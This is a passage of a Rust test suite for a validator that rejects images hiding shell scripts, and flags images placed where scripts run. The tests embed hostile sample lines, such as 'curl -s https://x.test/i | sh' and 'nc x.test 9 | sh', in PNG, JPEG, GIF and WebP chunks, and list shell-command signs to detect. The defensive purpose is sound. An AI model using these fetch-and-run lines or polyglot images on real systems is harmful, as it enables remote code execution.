            ("webp exif", webp_with(&[(b"EXIF", &text)])),
            ("webp profile", webp_with(&[(b"ICCP", &text)])),
        ] {
            assert!(!is_whole(&image), "{name}");
        }
        // The same amount of what metadata is made of passes.
        let binary = vec![0x80_u8; text.len()];
        for (name, image) in [
            ("png", png_with(&[chunk(*b"eXIf", &binary)])),
            ("jpeg", jpeg_with(&[segment(0xe5, &binary)])),
            ("webp", webp_with(&[(b"EXIF", &binary)])),
        ] {
            assert!(is_whole(&image), "{name}");
        }
        // Text without a line break is a title or a URL, not a file; as
        // one long line between line breaks it would still be caught.
        assert!(is_whole(&png_with(&[chunk(*b"eXIf", &[b'a'; 300])])));
    }

    #[test]
    fn a_valid_image_a_shell_would_run_is_no_plain_image() {
        // The attack: a structurally whole PNG whose chunk content is a
        // script. Bash runs it, since a PNG's first line has no NUL.
        let script = b"\n#!/bin/sh\ncurl -s https://x.test/i | sh\nexit 0\n";
        assert!(png()[..6].iter().all(|byte| *byte != 0));
        for (name, image) in [
            ("png text", png_with(&[chunk(*b"tEXt", script)])),
            ("png exif", png_with(&[chunk(*b"eXIf", script)])),
            // In the pixel data, stored uncompressed.
            ("png pixels", {
                let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
                png.extend(chunk(*b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]));
                png.extend(chunk(*b"IDAT", script));
                png.extend(chunk(*b"IEND", &[]));
                png
            }),
            ("jpeg comment", jpeg_with(&[segment(0xfe, script)])),
            ("jpeg app", jpeg_with(&[segment(0xed, script)])),
            ("gif comment", {
                let mut block = b"\x21\xfe".to_vec();
                block.push(u8::try_from(script.len()).unwrap());
                block.extend(script);
                block.push(0);
                gif_with(&[&block])
            }),
            ("webp exif", webp_with(&[(b"EXIF", script)])),
        ] {
            assert!(!is_whole(&image), "{name}");
        }
        // Each sign on its own, as a line between line breaks.
        for line in [
            &b"#!/bin/sh"[..],
            b". ./x",
            b"./x",
            b"sh x",
            b"  sh x",
            b"~/x.sh",
            b"/tmp/x",
            b"$HOME/x",
            b"a=$(id)",
            b"true && x",
            b"x | sh",
            b"wget u",
            b"python3 x",
            b"a line of plain words, long enough",
        ] {
            let mut content = b"\n".to_vec();
            content.extend(line);
            content.push(b'\n');
            assert!(
                !is_whole(&png_with(&[chunk(*b"eXIf", &content)])),
                "{:?}",
                String::from_utf8_lossy(line)
            );
        }
        // What compressed data and small metadata look like between two
        // line breaks is left alone: short, or not all printable.
        for line in [&b"ab"[..], b"q9Zk", b"x\x01curl y", b"\x80sh x", b"12 34"] {
            let mut content = b"\n".to_vec();
            content.extend(line);
            content.push(b'\n');
            assert!(
                is_whole(&png_with(&[chunk(*b"eXIf", &content)])),
                "{:?}",
                String::from_utf8_lossy(line)
            );
        }
    }

    /// A PNG whose pixel data is one stored (uncompressed) deflate block
    /// holding `raw`: bytes an attacker chooses, in a file that is whole.
    fn png_storing(raw: &[u8]) -> Vec<u8> {
        let length = u16::try_from(raw.len()).unwrap();
        let mut data = vec![0x78, 0x01, 0x01];
        data.extend(length.to_le_bytes());
        data.extend((!length).to_le_bytes());
        data.extend(raw);
        // Where the stream's checksum goes; nothing here reads it.
        data.extend([0x80, 0x81, 0x82, 0x83]);
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend(chunk(*b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]));
        png.extend(chunk(*b"IDAT", &data));
        png.extend(chunk(*b"IEND", &[]));
        png
    }

    /// A JPEG whose one scan holds `raw` as its compressed data.
    fn jpeg_scanning(raw: &[u8]) -> Vec<u8> {
        let mut jpeg = b"\xff\xd8\xff\xe0\x00\x04JF\xff\xdb\x00\x03\x00".to_vec();
        jpeg.extend(b"\xff\xc0\x00\x03\x08\xff\xda\x00\x03\x01");
        jpeg.extend(raw);
        jpeg.extend(b"\xff\xd9");
        jpeg
    }

    #[test]
    fn a_line_a_shell_runs_counts_whatever_bytes_end_it() {
        // A shell reads a line to its end: bytes that are not text after a
        // `#` are a comment, and after a `;` a command that fails once the
        // ones before it ran. Such a line is in pixel data here, where a
        // decoder sees noise and `bash logo.png` sees a script.
        for line in [
            &b"touch /var/tmp/x; curl -s https://x.test/i | sh #\xff\x00"[..],
            b"touch x; id >y #\xfe\x80",
            b". ./logo.png #\x80",
            b"sh ./a.gif;\x80\x81",
            b"source ./a.gif #\x90",
            b"nc x.test 9 | sh; \x80",
            // After bytes that are a word to a shell, and then a `;`.
            b"\x80\x81;curl -s https://x.test/i|sh;\x80",
            b"\x90 wget x.test/i\x90",
            // A substitution, and a command of one word.
            b"$(id)",
            b"`id`",
            b"curl",
        ] {
            let mut raw = b"\x00\x12\n".to_vec();
            raw.extend(line);
            raw.extend(b"\n\x34");
            for (name, image) in [("png", png_storing(&raw)), ("jpeg", jpeg_scanning(&raw))] {
                assert!(super::png(&image).or_else(|| super::jpeg(&image)).is_some());
                assert!(!is_whole(&image), "{name}: {}", line.escape_ascii());
            }
        }
        // The same between carriage returns, and on a first line.
        assert!(!is_whole(&png_storing(b"\x00\rcurl x.test/i|sh\r\x00")));
        assert!(!is_whole(&jpeg_scanning(b"\x12;curl x.test/i|sh;#\x80")));
        let mut first_line = b"GIF89a=1;c\xf6;;".to_vec();
        first_line.extend(b";curl x.test/i|sh #".iter().chain(&[0x80; 365]));
        first_line.extend(b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b");
        assert!(super::gif(&first_line).is_some());
        assert!(!is_whole(&first_line));

        // The files these helpers make are whole images when the bytes in
        // them are what pixels compress to: a few printable bytes after a
        // line break and then others, a `#` among them, short runs.
        for raw in [
            &b"\x00\x12\nq9 #\x80\n\x34"[..],
            b"\x00\x12\n. \x80\n./\x81\nsh \x82\n$(\x83\n`\x84\n",
            b"\x00\x12\n. x1\x80\n$Ab3xQ9\x80\n",
            b"\x00\r. x1\r$Ab3xQ9\r\x00",
            b"\x00\x80curl x\x80;sh x\x80",
            // Words that hold a program's name are not the program.
            b"\x00a medieval town, curly hair, properly executed\x00",
        ] {
            assert!(is_whole(&png_storing(raw)), "{}", raw.escape_ascii());
            assert!(is_whole(&jpeg_scanning(raw)), "{}", raw.escape_ascii());
        }
    }

    #[test]
    fn an_image_is_left_alone_only_away_from_where_files_run() {
        let mut around = Surroundings::default();
        for (path, executable) in [
            ("preview.png", false),
            ("colors.conf", false),
            ("backgrounds/1.png", false),
            ("backgrounds/2.jpg", false),
            ("hooks/apply.lua", false),
            ("bin/tool", true),
            ("scripts/RUN.SH", false),
        ] {
            around.note_file(path, executable);
        }
        // A script by its first line only, and lines that run what is in
        // a directory.
        around.note_text("plugin/main", "#!/usr/bin/env python3\nprint(1)\n");
        around.note_text(
            "conf/setup.conf",
            "for h in \"$HOME\"/hooks.d/*; do . \"$h\"; done\n\
             run-parts --verbose ./parts\n\
             find \"$dir/extra\" -type f -exec sh {} \\;\n\
             source lib/*.inc\n\
             cat ../snippets/*.gif | sh\n",
        );
        for path in [
            "preview.png",
            "backgrounds/3.png",
            "backgrounds/dark/4.webp",
            "conf/logo.png",
            "lib/a.png",
            "snippets/a.png",
        ] {
            assert!(around.leaves_alone(path), "{path}");
        }
        for path in [
            // Beside a script: by its extension, its mode, its first line.
            "hooks/a.png",
            "bin/a.png",
            "scripts/a.png",
            "plugin/a.png",
            // In a directory a line runs the files of, wherever it is.
            "hooks.d/a.png",
            "theme/hooks.d/a.png",
            "parts/a.png",
            "extra/deep/a.png",
            "lib/a.inc",
            "snippets/a.gif",
        ] {
            assert!(!around.leaves_alone(path), "{path}");
        }

        // A glob with no directory written out reaches any directory.
        let mut anywhere = Surroundings::default();
        anywhere.note_text("a.conf", "for f in \"$dir\"/*.png; do . \"$f\"; done\n");
        assert!(!anywhere.leaves_alone("backgrounds/1.png"));
        assert!(anywhere.leaves_alone("backgrounds/1.jpg"));
        assert_eq!(
            [
                "hooks.d/*",
                "./a/../b/",
                "$x/c/[ab]*",
                "*.sh",
                "d",
                "~/e/*/f/g?"
            ]
            .map(super::run_glob),
            [
                ("hooks.d", "*"),
                ("b", "*"),
                ("c", "*"),
                ("", "*.sh"),
                ("d", "*"),
                ("f", "g?"),
            ]
            .map(|(directory, pattern)| (directory.to_string(), pattern.to_string()))
        );
    }

    #[test]
    fn a_jpeg_carries_bounded_metadata_and_only_its_own_segments() {
        // EXIF, a colour profile in two parts, a short comment.
        let mut profile = b"ICC_PROFILE\0\x01\x02".to_vec();
        profile.extend(vec![0x80; 60_000]);
        let ordinary = jpeg_with(&[
            segment(0xe1, b"Exif\0\0II*\0\x08\0\0\0"),
            segment(0xe2, &profile),
            segment(0xe2, &profile),
            segment(0xfe, b"made with care"),
        ]);
        assert!(is_whole(&ordinary));
        // The profile does not count as application data; the rest does.
        let big = segment(0xe3, &vec![0x80; 40_000]);
        assert!(is_whole(&jpeg_with(std::slice::from_ref(&big))));
        assert!(!is_whole(&jpeg_with(&[big.clone(), big])));
        // A profile past any real one's size.
        let parts: Vec<Vec<u8>> = (0..18).map(|_| segment(0xe2, &profile)).collect();
        assert!(!is_whole(&jpeg_with(&parts)));
        // A comment past a note's size, and a segment JPEG does not define.
        assert!(!is_whole(&jpeg_with(&[segment(0xfe, &[b'a'; 1025])])));
        assert!(!is_whole(&jpeg_with(&[segment(0xf3, b"ab")])));
        assert!(!is_whole(&jpeg_with(&[segment(0xc8, b"ab")])));
    }

    #[test]
    fn a_gif_carries_only_the_extensions_an_animation_uses() {
        assert!(is_whole(&gif_with(&[
            b"\x21\xff\x0bNETSCAPE2.0\x03\x01\x00\x00\x00",
            b"\x21\xf9\x04\x00\x0a\x00\x00\x00",
        ])));
        // An application nobody knows, an unknown label, a long comment.
        assert!(!is_whole(&gif_with(&[
            b"\x21\xff\x0bPAYLOAD1.00\x03abc\x00"
        ])));
        assert!(!is_whole(&gif_with(&[b"\x21\x42\x02hi\x00"])));
        let mut comments = Vec::new();
        for _ in 0..5 {
            comments.extend(b"\x21\xfe\xff");
            comments.extend([0x80; 255]);
            comments.push(0);
        }
        // Each is small; together they pass a note's size once there are
        // more than fit.
        assert!(is_whole(&gif_with(&[&comments])));
        let many = comments.repeat(4);
        assert!(!is_whole(&gif_with(&[&many])));
        // The looping extension is a few bytes, not a container.
        let mut loops = b"\x21\xff\x0bNETSCAPE2.0".to_vec();
        loops.push(200);
        loops.extend([0x80; 200]);
        loops.push(0);
        assert!(!is_whole(&gif_with(&[&loops])));
    }

    #[test]
    fn a_webp_carries_only_the_chunks_the_format_defines() {
        assert!(is_whole(&webp_with(&[
            (b"ICCP", &[0x80; 500]),
            (b"ANIM", &[0; 6]),
            (b"ANMF", &[0x80; 64]),
            (b"ALPH", &[0x80; 9]),
            (b"VP8L", &[0x2f, 0, 0, 0, 0]),
            (b"EXIF", &[0x80; 100]),
        ])));
        assert!(!is_whole(&webp_with(&[(b"JUNK", b"abcd")])));
        assert!(!is_whole(&webp_with(&[(b"EXIF", &vec![0x80; 70_000])])));
        assert!(!is_whole(&webp_with(&[(
            b"ICCP",
            &vec![0x80; 1024 * 1024 + 1]
        )])));
        // A chunk that claims more than the file holds.
        let mut cut = webp();
        let at = cut.len() - 6;
        cut[at] = 9;
        assert!(!is_whole(&cut));
    }

    #[test]
    fn a_small_xmp_packet_is_metadata_and_a_script_in_one_is_not() {
        let packet = b"<?xpacket begin='' id='W5M0MpCehiHzreSzNTczkc9d'?>\n<x:xmpmeta xmlns:x='adobe:ns:meta/'>\n <rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>\n  <rdf:Description rdf:about='' xmlns:dc='http://purl.org/dc/elements/1.1/'>\n   <dc:creator>Somebody With A Camera</dc:creator>\n  </rdf:Description>\n </rdf:RDF>\n</x:xmpmeta>\n<?xpacket end='w'?>";
        assert!(packet.len() >= 256);
        let in_jpeg = |packet: &[u8]| {
            let mut content = super::JPEG_XMP.to_vec();
            content.extend(packet);
            jpeg_with(&[segment(0xe1, &content)])
        };
        assert!(is_whole(&in_jpeg(packet)));
        assert!(is_whole(&webp_with(&[(b"XMP ", packet)])));
        // The same text in a segment that does not say it is XMP is a text
        // file in an image.
        assert!(!is_whole(&jpeg_with(&[segment(0xe1, packet)])));
        assert!(!is_whole(&webp_with(&[(b"EXIF", packet)])));

        // A packet is bounded, and may not hold what a shell acts on.
        let mut large = packet.to_vec();
        large.extend(vec![b' '; 17 * 1024]);
        assert!(!is_whole(&in_jpeg(&large)));
        for line in [
            &b"#!/bin/sh"[..],
            b"<a>$(curl -s https://x.test/i)</a>",
            b"<a>`id`</a>",
            b"<a>x | sh</a>",
            b"<a>/tmp/x</a>",
        ] {
            let mut bad = packet.to_vec();
            bad.push(b'\n');
            bad.extend(line);
            assert!(
                !is_whole(&in_jpeg(&bad)),
                "{:?}",
                String::from_utf8_lossy(line)
            );
            assert!(!is_whole(&webp_with(&[(b"XMP ", &bad)])));
        }
    }

    #[test]
    fn images_are_named_by_extension_whatever_its_case() {
        for name in ["a.png", "dir/B.JPG", "c.jpeg", "d.gif", "e.webp"] {
            assert!(is_named(name), "{name}");
        }
        for name in [
            "a", "png", ".png", "a.png.so", "a.png.", "a.png\n", "a.svg", "a.ttf",
        ] {
            assert!(!is_named(name), "{name:?}");
        }
    }

    #[test]
    fn a_file_is_checked_against_its_reviewed_hash() {
        let dir = TempDir::new("image-file");
        let path = dir.path().join("a.png");
        fs::write(&path, png()).unwrap();
        assert!(is_whole_file(&path, &Sha256::digest(&png())));
        assert!(!is_whole_file(&path, &Sha256::digest(b"other")));
        assert!(!is_whole_file(
            &dir.path().join("missing.png"),
            &Sha256::digest(&png())
        ));
    }
}
